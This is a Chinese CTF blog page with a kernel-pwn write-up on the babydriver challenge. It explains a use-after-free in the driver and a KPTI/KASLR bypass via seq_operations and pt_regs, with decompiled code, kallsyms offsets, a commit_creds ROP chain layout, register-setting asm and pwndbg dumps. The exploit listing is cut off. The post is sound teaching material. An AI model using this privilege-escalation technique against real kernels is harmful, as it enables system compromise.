<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/19/seq_operations%20+%20pt_regs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/19/seq_operations%20+%20pt_regs/" class="post-title-link" itemprop="url">seq_operations+pt_regs</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-19 19:26:43" itemprop="dateCreated datePublished" datetime="2023-02-19T19:26:43+08:00">2023-02-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 12:29:53" itemprop="dateModified" datetime="2023-03-01T12:29:53+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babydriver</strong></p>
<p>先进行解压：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv rootfs.cpio rootfs.cpio.gz </span><br><span class="line">gunzip rootfs.cpio.gz</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 <code>rootfs.cpio</code> 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<ul>
<li>smep</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>伪条件竞争引发的 UAF 漏洞，即当我们同时打开两个设备，第二次会覆盖第一次分配的空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(fp, command);</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(arg, <span class="number">0x24000C0</span>LL);<span class="comment">// void *kmalloc(size_t size, int flags)</span></span><br><span class="line">    babydev_struct.device_buf_len = arg;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13defalut:arg is %ld\n&quot;</span>, arg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以再释放后再申请（改写大小）</li>
</ul>
<p>babydriver 是我们入门内核的第一道题目，现在来看看它的两个变种</p>
<p><strong>变种一：添加 KPTI 和 kaslr</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 pti=on kaslr&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<ul>
<li>smep</li>
<li>kaslr</li>
<li>KPTI（在 <code>append</code> 中添加 <code>pti=on</code>）</li>
</ul>
<p>KPTI（Kernel Page Table Isolation）就是内核页表隔离（内核版本 4.15 以上），使内核与用户态进程使用两套独立的页表</p>
<ul>
<li>在 Linux 中，寄存器 CR3 用于存储当前的 PGD 地址（四级页表结构：<code>PGD-&gt;PUD-&gt;PMD-&gt;PTE</code>）</li>
<li>如果开启了 KPTI，则在内核态与用户态切换时会同时切换 CR3 </li>
<li>为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址）</li>
<li>只需要将 CR3 的第 13 位取反便能完成页表切换的操作</li>
</ul>
<p>KPTI：会使 <code>ret2usr</code> 失效，在用户空间中构造 <code>fake tty_operations</code> 也会失效，在 ROP 中需要切换 CR3 的 gadget</p>
<p>KPTI pass：使用 <code>seq_operations + pt_regs</code></p>
<p>结构体 <code>seq_operations</code> 的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code>）便会在内核空间中分配一个 <code>seq_operations</code> 结构体 </li>
<li>当我们 read 一个 stat 文件时，内核会调用其 <code>proc_ops</code> 的 <code>proc_read_iter</code> 指针，然后调用 <code>seq_operations-&gt;start</code> 函数指针</li>
</ul>
<p>结构体 <code>pt_regs</code> 的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在系统调用当中有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15</li>
<li>只需要寻找到一条形如 <code>add rsp, val; ret</code> 的 gadget 便能够完成 ROP</li>
</ul>
<p>于是泄露思路如下：</p>
<ul>
<li>先执行两次 <code>open(&quot;/dev/babydev&quot;, O_RDWR)</code></li>
<li>执行 <code>ioctl(fd[0], 0x10001, 0x20)</code>，修改内核结构体的大小为 0x20（使 <code>seq_operations</code> 可以被放入这里）</li>
<li>释放 <code>fd[0]</code>，并且执行 <code>open(&quot;/proc/self/stat&quot;, O_RDONLY)</code>（内核结构体被释放，又被申请回来存放 <code>seq_operations</code>）</li>
<li>此时 <code>fd[1]</code> 仍然指向内核结构体，于是用 <code>read(fd[1], leak_data, 0x10)</code> 泄露内核基地址</li>
</ul>
<p>使用如下命令来查找需要的偏移：（使用前先关闭 kaslr，并开启 root 权限）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep commit_creds</span></span><br><span class="line">ffffffff810a1420 T commit_creds</span><br><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep init_cred</span></span><br><span class="line">ffffffff81e48c60 D init_cred</span><br></pre></td></tr></table></figure>
<p>接下来需要把 <code>seq_operations-&gt;start</code> 覆盖为一个 gadget（类似于 <code>add rsp, offset;...; ret;</code>）</p>
<p>在开启 KPTI 内核，提权返回到用户态（<code>iretq/sysret</code>）之前如果不设置CR3寄存器的值，就会导致进程找不到当前程序的正确页表，引发段错误</p>
<p>常规设置需要从上到下执行3个 gadget：（改写 CR3 的第13位）</p>
<ul>
<li><code>pop rdi; ret;</code>（RDI 写入 <code>0x6f0</code>）</li>
<li><code>mov cr4, rdi; ret;</code></li>
<li><code>swapgs; pop rbp; ret;</code></li>
</ul>
<p>使用 <code>pt_regs</code> 在内核态写 ROP 链，就没有那么多空间来放入 gadget，于是我们用 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数一次搞定（低版本的内核没有这个函数）</p>
<ul>
<li>需要的栈布局如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + <span class="number">22</span></span><br><span class="line"><span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line"><span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line">user_shell_addr</span><br><span class="line">user_cs</span><br><span class="line">user_rflags</span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure>
<ul>
<li>只要把 <code>swapgs_restore_regs_and_return_to_usermode + 22</code> 放在 R10 的位置就可以符合条件</li>
</ul>
<p>综合上面的内容，我们可以得到劫持控制流的思路：</p>
<ul>
<li>执行 <code>write(fd[1], &amp;magic_addr, 8)</code> 写入形如 <code>add rsp, 0x148; ...; ret;</code> 的 gadget</li>
<li>通过 <code>pt_regs</code> 构造 ROP 链（R10 写上 <code>swapgs_restore_regs_and_return_to_usermode + 22</code>）</li>
<li>在 gadget 打上断点，然后计算该 gadget 到 <code>pt_regs</code> 结构体的偏移，寻找准确的 gadget</li>
</ul>
<p>在实际的调试中，我发现 <code>pt_regs</code> 的内容没有那么规整（可能是 sys_read 破坏了 <code>pt_regs</code> 原本的结构），下面给一个调试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span> </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>GDB 部分内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff8800027cbdd8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xffff8800027cbdd8</span> —▸ <span class="number">0xffffffff8122fab8</span> ◂— mov    r15, rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffff8800027cbde0</span> —▸ <span class="number">0xffffffff810ee6a9</span> ◂— <span class="keyword">xor</span>    edx, edx</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffff8800027cbde8</span> —▸ <span class="number">0x7fff99311170</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffff8800027cbdf0</span> —▸ <span class="number">0xffff88000276c1c0</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffff8800027cbdf8</span> ◂— <span class="number">8</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rsi <span class="number">0xffff8800027cbe00</span> ◂— <span class="number">0</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0xffff8800027cbe38</span> ◂— push   rbp <span class="comment">/* 0x55555555; &#x27;UUUU&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│ rbp <span class="number">0xffff8800027cbe40</span> —▸ <span class="number">0xffff8800027cbec8</span> —▸ <span class="number">0xffff8800027cbf00</span> —▸ <span class="number">0xffff8800027cbf48</span> ◂— adc    dword ptr [rcx], edx <span class="comment">/* 0xbbbb1111 */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0xffff8800027cbe48</span> —▸ <span class="number">0xffffffff8120ad17</span> ◂— mov    rdi, qword ptr [rbp - <span class="number">0x18</span>]</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0xffff8800027cbe50</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x20000 */</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│ r12 <span class="number">0xffff8800027cbf18</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│     <span class="number">0xffff8800027cbf20</span> ◂— adc    byte ptr [rdi], cl <span class="comment">/* 0xfdb69a886c1b0f10 */</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│     <span class="number">0xffff8800027cbf28</span> ◂— <span class="keyword">and</span>    ah, byte ptr [rdx] <span class="comment">/* 0xbbbb2222 */</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│     <span class="number">0xffff8800027cbf30</span> ◂— <span class="keyword">and</span>    ah, byte ptr [rdx] <span class="comment">/* 0x22222222; &#x27;&quot;&quot;&quot;&quot;&#x27; */</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│     <span class="number">0xffff8800027cbf38</span> ◂— <span class="keyword">xor</span>    esi, dword ptr [rbx] <span class="comment">/* 0x33333333; &#x27;3333&#x27; */</span></span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│     <span class="number">0xffff8800027cbf40</span> ◂— add    byte ptr [rax], r8b <span class="comment">/* 0x44444444; &#x27;DDDD&#x27; */</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│     <span class="number">0xffff8800027cbf48</span> ◂— adc    dword ptr [rcx], edx <span class="comment">/* 0xbbbb1111 */</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│     <span class="number">0xffff8800027cbf50</span> —▸ <span class="number">0xffffffff81819c32</span> ◂— mov    qword ptr [rsp + <span class="number">0x50</span>], rax</span><br><span class="line">    ......</span><br><span class="line"><span class="number">37</span>:<span class="number">01b</span>8│  <span class="number">0xffff8800027cbf90</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x11110000 */</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0│  <span class="number">0xffff8800027cbf98</span> ◂— cdq     <span class="comment">/* 0x99999999 */</span></span><br><span class="line"><span class="number">39</span>:<span class="number">01</span>c8│  <span class="number">0xffff8800027cbfa0</span> ◂— mov    byte ptr [rax + <span class="number">0x8888</span>], cl <span class="comment">/* 0x88888888 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意 <code>0xbbbb2222 -&gt; 0xbbbb1111</code> 和 <code>0x11110000 -&gt; 0x88888888</code></li>
<li>ROP 的构造思路：<ul>
<li>在 <code>0xbbbb2222-0x33333333</code> 分别放入 <code>pop_rdi_ret</code> <code>init_cred</code> <code>commit_creds</code></li>
<li>在 <code>0x44444444</code> 放入 <code>add_rsp_offset_ret</code> 以跳转到 <code>0x11110000</code></li>
<li>在 <code>0x11110000</code> 中放入 <code>swapgs_restore_regs_and_return_to_usermode + 22</code></li>
<li>在 <code>seq_operations-&gt;start</code> 中写入的 gadget 需要把栈迁移的 ROP 链上</li>
</ul>
</li>
</ul>
<p>本题目给的内核版本是 4.4.72，没有 KPTI 和 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数，因此没法完成演示</p>
<p>下面给出非完成的 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 